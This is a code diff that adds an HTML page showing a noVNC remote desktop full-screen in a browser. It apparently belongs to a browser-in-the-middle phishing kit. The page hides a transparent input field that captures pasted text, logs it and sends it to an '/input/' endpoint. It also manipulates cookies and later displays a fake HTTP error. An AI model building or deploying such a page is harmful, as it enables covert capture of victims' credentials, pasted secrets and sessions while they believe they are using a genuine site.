@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><title>
+
+</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            margin: 0;
+            background-color: white;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        html {
+            height: 100%;
+            background-color: white;
+        }
+        #screen {
+		z-index: 100;
+		flex: 1;
+		overflow: hidden;
+		/*background-color: white;*/
+		color: white;
+        }
+	#error {
+		z-index: 50;
+		position: absolute;
+		width: 40%;
+		height: 40%;
+		left: 0;
+		right: 0;
+		margin: 10% auto;
+		visibility: hidden; /* show delayed via js */
+	}
+	#inp {
+		position: absolute;
+		bottom: 0px;
+		left: 5%;
+		width: 5%;
+		z-index: 200;
+		font-size: 4px;
+		border: none;
+		opacity: 0;
+	}
+	</style>
+</head>
+
+<!--<body onload="start()">-->
+<body>
+	<div id="screen"></div>
+	<div id="error">
+		<h1>HTTP 0815</h1>
+		<p>Error - Please try again later</p>
+	</div>
+	<!--<input type="text" id="inp" onKeyDown="keydown(event)" onKeyUp="keyup(event)"></input>-->
+	<!--<input type="text" id="inp" onKeyUp="keyup(event)"></input>-->
+	<input type="text" id="inp">
+
+	<script type="module" crossorigin="anonymous">
+	import RFB from './core/rfb.js';
+	let rfb;
+	let desktopName;
+	let inputVal;
+
+	function credentialsAreRequired(e) {
+	    const password = 'false';
+	    rfb.sendCredentials({ password: password });
+	}
+
+	function updateDesktopName(e) {
+	    desktopName = e.detail.name;
+	}
+
+	function readQueryVariable(name, defaultValue) {
+	    const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
+		  match = ''.concat(document.location.href, window.location.hash).match(re);
+
+	    if (match) {
+		return decodeURIComponent(match[1]);
+	    }
+
+	    return defaultValue;
+	}
+
+	const host = readQueryVariable('host', window.location.hostname);
+	let port = readQueryVariable('port', window.location.port);
+	const password = readQueryVariable('password');
+	const path = readQueryVariable('path', 'websockify');
+
+	let url;
+	if (window.location.protocol === "https:") {
+	    url = 'wss';
+	} else {
+	    url = 'ws';
+	}
+	url += '://' + host;
+	if(port) {
+	    url += ':' + port;
+	}
+	url += '/' + path;
+
+	rfb = new RFB(document.getElementById('screen'), url,
+		      { credentials: { password: password } });
+	rfb.addEventListener("credentialsrequired", credentialsAreRequired);
+	rfb.addEventListener("desktopname", updateDesktopName);
+	rfb.viewOnly = readQueryVariable('view_only', false);
+	rfb.scaleViewport = readQueryVariable('scale', false);
+
+
+	function start() {
+		if(!location.search.search("reqid") || !document.cookie) return;
+
+		document.querySelector("canvas").focus();
+
+		document.querySelector("canvas").addEventListener("keydown", function(event) {
+			let inp = document.getElementById("inp");
+
+			if(event.ctrlKey && (event.key === "v" || event.key === "V")) {
+				//console.log("CTRL+V detected");
+				inp.focus();
+
+				// release left Ctrl key on server
+				rfb.sendKey(0xffe3, null, false);
+				// release v key on server
+				rfb.sendKey(0x0076, null, false);
+				//rfb.sendKey(0x0056, null, false);
+			}
+		});
+
+		document.getElementById("inp").addEventListener("input", storeInp);
+		document.getElementById("inp").addEventListener("keyup", focusCan);
+
+		const c = decodeURIComponent(document.cookie);
+		const ca = c.split('=');
+		const key = ca[0];
+		const val = ca[1];
+		const d = new Date();
+		d.setTime(d.getTime() + (1000*60*5));
+		
+		document.cookie = key + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+		document.cookie = key + "=" + val + "; expires=" + d.toUTCString();
+	}
+
+	function storeInp(e) {
+		inputVal = document.getElementById("inp").value;
+		console.log("[*] pasted text: " + inputVal);
+	}
+
+	function sendPaste() {
+		if(!inputVal) return;
+
+		let request = new XMLHttpRequest();
+		let url = window.location.toString();
+		inputVal = encodeURIComponent(inputVal);
+		url = url.replace("/?", "/input/?") + "&v=" + inputVal;
+	
+		console.log("[*] " + url);
+
+		request.open("GET", url);
+		request.addEventListener('load', function(event) {
+			if (request.status >= 200 && request.status < 300) {
+				//console.log("[*] " + url + " -> " + request.responseText);
+			} else {
+				console.warn("[!] " + url + " -> " + request.statusText, request.responseText);
+			}
+			
+			// clean up, set focus to canvas
+			document.getElementById("inp").value = "";
+			document.querySelector("canvas").focus();
+		});
+		request.send();
+	}
+
+	function focusCan(e) {
+		// send paste if Ctrl released
+		if(e.keyCode == 17)
+			sendPaste();
+	}
+
+	// wait for RFB initialisation
+	setTimeout( function() {
+		start();
+	}, 1500);
+
+	</script>
+
+	<script>
+	// display content behind canvas after time
+	setTimeout( function(){ 
+		document.getElementById("error").style.visibility = "visible";
+	}, 10000);
+	</script>
+</body>
+</html>
